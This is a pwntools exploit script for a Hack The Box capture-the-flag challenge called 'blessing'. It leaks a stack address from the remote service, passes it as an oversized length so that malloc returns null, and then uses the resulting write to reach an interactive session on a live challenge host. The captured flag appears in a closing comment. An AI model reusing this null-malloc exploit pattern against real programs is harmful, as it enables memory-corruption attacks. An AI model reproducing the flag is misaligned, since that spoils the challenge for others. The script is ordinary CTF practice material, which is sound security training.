from pwn import *

# read(0, null, size) will not raise error

e = ELF("./blessing_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

'''
main
scanf
read null size
'''

script = '''
b *main
breakrva 0x16C7
breakrva 0x171E
'''

p = remote("83.136.255.44", 58250)
#p = process("./blessing_patched")
#p = gdb.debug("./blessing_patched", gdbscript = script)

# leak v6 address
p.recvuntil(b"this: ")
v6 = int(p.recv(14), 16)
print(hex(v6))

# make malloc return null (because big size)
p.sendlineafter(b"length: ", f"{v6}".encode())
p.sendafter(b"song: ", b"A")

p.interactive()
#HTB{3v3ryth1ng_l00k5_345y_w1th_l34k5_36b8efb81a4a5256b4e7e83972960d91}